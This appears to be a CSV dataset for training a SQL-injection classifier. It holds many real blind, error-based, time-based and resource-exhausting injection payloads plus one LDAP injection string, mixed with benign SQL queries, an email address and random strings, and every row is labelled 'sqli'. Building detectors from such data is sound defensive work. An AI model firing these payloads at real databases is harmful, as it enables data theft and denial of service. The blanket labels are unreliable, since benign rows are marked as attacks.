query,label
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",sqli
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",sqli
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",sqli
SELECT MIN ( harbor )  AS appropriate FROM ranch,sqli
"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",sqli
-9197'  )   or   (  6877  =  8010  )  *8010 and   (  'umwl'  =  'umwl,sqli
1%' waitfor delay '0:0:5'--,sqli
 (  case when 2646  =  8520 then 2646 else null end  ) ,sqli
waitfor delay '0:0:5' and   (  'gpqx' like 'gpqx,sqli
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,sqli
1'+  (  select vfmy where 5711  =  5711,sqli
57879425v,sqli
SELECT MIN ( power )  AS sum FROM sun,sqli
SELECT cut FROM surface,sqli
SELECT COUNT ( government ) FROM powder,sqli
"   SELECT pick, thumb, vessels FROM horn WHERE wooden  IS NULL",sqli
"  SELECT * FROM halfway WHERE somehow NOT IN  ( 'struck', 'handle', 'lot' )  ",sqli
1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',sqli
SELECT * FROM agree WHERE    NOT labor = 'action',sqli
nehemiah,sqli
 UPDATE atmosphere SET quiet = 'chart'WHERE movie = 'speech',sqli
"1   )    )    as llnm where 6510  =  6510 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
&',sqli
SELECT * FROM point,sqli
if  (  9953  =  4347  )   select 9953 else drop function ocau--,sqli
select case when 9390  =  5752 then 1 else null end--,sqli
-7901  )   order by 1--,sqli
1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',sqli
4377,sqli
@,sqli
SELECT TOP 3 * FROM food WHERE begun = 'careful' SELECT * FROM milk,sqli
38747653j,sqli
SELECT * FROM laugh,sqli
SELECT TOP 50 PERCENT * FROM wealth,sqli
%2A%28%7C%28objectclass%3D%2A%29%29,sqli
SELECT pig FROM near UNION SELECT position FROM earth ORDER BY happen,sqli
SELECT orbit ( s )  FROM east LEFT JOIN,sqli
8322,sqli
SELECT MIN ( truck )  AS me FROM west,sqli
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'jmjw' like 'jmjw",sqli
SELECT fought ( s )  FROM planned,sqli
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""sxih""  =  ""sxih",sqli
"  SELECT redID AS ID, let AS automobile FROM seeing",sqli
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,sqli
SELECT AVG ( hidden ) FROM too SELECT SUM ( thumb ) ,sqli
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",sqli
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,sqli
"  SELECT WEEK ( ""2017-06-15"" ) ;",sqli
"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",sqli
"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
SELECT press FROM bear UNION ALL SELECT finger FROM one ORDER BY central,sqli
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",sqli
SELECT thy ( s )  FROM engine UNION,sqli
inglis@baltasarsantos.vu,sqli
SELECT * FROM strong WHERE event = 'obtain'  OR phrase = 'daughter',sqli
SELECT * FROM location WHERE stopped  BETWEEN 10 AND 20,sqli
SELECT felt,sqli
SELECT small ( s )  FROM force LEFT JOIN,sqli
SELECT * FROM friend WHERE were NOT LIKE '[seed]%',sqli
-3339' or 8571  =  8571--,sqli
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",sqli
"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
9nte0uer3o,sqli
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/reset_password.php' ORDER BY wp_posts.post_title ASC,sqli
SELECT * FROM protection FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM higher,sqli
SELECT * FROM although FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM consonant,sqli
